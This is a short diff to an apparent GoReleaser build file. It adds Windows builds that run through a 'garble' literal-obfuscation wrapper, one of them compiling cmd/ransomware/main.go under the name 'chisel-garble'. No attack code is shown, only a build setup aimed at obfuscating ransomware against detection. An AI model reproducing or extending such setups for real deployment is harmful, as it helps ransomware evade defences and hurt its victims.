@@ -13,6 +13,16 @@ builds:
       - windows
     goarch:
       - amd64
+    gobinary: "garble-literals" 
+  - binary: chisel-garble
+    goos:
+      - windows
+    goarch:
+      - amd64
+    ldflags:
+      - ""
+    gobinary: "garble-literals.ps1"
+    main: cmd/ransomware/main.go
 archives:
   - format: gz
     files:
